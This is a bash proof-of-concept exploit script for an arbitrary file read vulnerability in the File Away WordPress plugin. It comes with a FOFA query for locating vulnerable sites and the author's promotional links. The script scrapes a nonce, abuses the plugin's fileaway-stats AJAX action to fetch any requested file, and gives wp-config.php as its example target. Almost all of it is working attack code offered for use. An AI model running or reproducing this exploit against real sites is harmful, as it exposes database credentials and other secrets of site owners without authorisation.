#!/usr/bin/env bash
# CVE-2025-2539 PoC - File Away <= 3.9.9.0.1 Arbitrary File Read
# FOFA (body="/wp-content/plugins/file-away/" || (body="http://gmpg.org/xfn/11" && body="/wp-content/plugins/sparklethemes-shortcodes") && icon_hash="1198047028")
# Medium: https://medium.com/@verylazytech
# GitHub: https://github.com/verylazytech
# Shop: https://shop.verylazytech.com
# Website: https://www.verylazytech.com

#!/bin/bash

banner() {
cat <<'EOF'
  ______     _______   ____   ___ ____  ____    ____  ____ _____ ___  
 / ___\ \   / / ____| |___ \ / _ \___ \| ___|  |___ \| ___|___ // _ \ 
| |    \ \ / /|  _|     __) | | | |__) |___ \    __) |___ \ |_ \ (_) |
| |___  \ V / | |___   / __/| |_| / __/ ___) |  / __/ ___) |__) \__, |
 \____|  \_/  |_____| |_____|\___/_____|____/  |_____|____/____/  /_/ 
                                                                      
__     __                _                      _____         _     
\ \   / /__ _ __ _   _  | |    __ _ _____   _  |_   _|__  ___| |__  
 \ \ / / _ \ '__| | | | | |   / _` |_  / | | |   | |/ _ \/ __| '_ \ 
  \ V /  __/ |  | |_| | | |__| (_| |/ /| |_| |   | |  __/ (__| | | |
   \_/ \___|_|   \__, | |_____\__,_/___|\__, |   |_|\___|\___|_| |_|
                 |___/                  |___/                       
                    

                    @VeryLazyTech - Medium
                    
EOF

}

# Call the banner function
banner


set -euo pipefail

if [[ $# -ne 2 ]]; then
  echo "Usage: $0 <target_url> <file_to_read>"
  echo "Example: $0 https://victim.com wp-config.php"
  exit 1
fi

TARGET="$1"
FILENAME="$2"
AJAX_URL="$TARGET/wp-admin/admin-ajax.php"

echo "[*] Target: $TARGET"
echo "[*] File to read: $FILENAME"

### 1. Get fileaway-stats nonce ###
echo "[*] Extracting fileaway_stats nonce..."
NONCE=$(curl -sk "$TARGET" | grep -Po 'var fileaway_stats\s*=\s*{[^}]*"nonce":"\K[0-9a-f]+') || {
  echo "[!] Failed to extract fileaway_stats nonce"
  exit 1
}

echo "[+] Nonce found: $NONCE"

### 2. Exploit arbitrary file read ###
echo "[*] Sending fileaway-stats request..."
RESP=$(curl -sk -X POST "$AJAX_URL" \
  -d "action=fileaway-stats" \
  -d "nonce=$NONCE" \
  -d "file=$FILENAME")

# Clean response
FILE_URL=$(echo "$RESP" | tr -d '\\' | sed 's/^"//;s/"$//')

if [[ -z "$FILE_URL" ]]; then
  echo "[!] Failed to extract file URL from response."
  exit 1
fi

echo "[+] Retrieved file URL: $FILE_URL"

### 3. Download file content ###
echo "[*] Downloading file content..."
CONTENT=$(curl -sk "$FILE_URL") || {
  echo "[!] Failed to download file content."
  exit 1
}

echo "$CONTENT" > "${TARGET#http*://}_$FILENAME"
echo "[+] File saved as: ${TARGET#http*://}_$FILENAME"

### 4. Show file content ###
cat ${TARGET#http*://}_$FILENAME
